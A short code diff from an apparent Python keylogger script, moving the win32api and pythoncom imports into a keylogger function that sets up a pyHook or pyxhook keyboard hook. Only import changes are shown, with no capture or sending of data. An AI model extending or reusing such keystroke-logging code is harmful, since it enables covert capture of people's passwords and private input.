@@ -1,6 +1,5 @@
-import win32api
 import sys
-import pythoncom, pyHook
+import pyHook
 import os
 
 keysPressed = ">"
@@ -17,6 +16,8 @@ def onkeyboardevent(event):
 
 def keylogger(size):
     if os.name == "nt":
+        import win32api
+        import pythoncom
         from pyHook import HookManager
     else:
         from pyxhook import HookManager
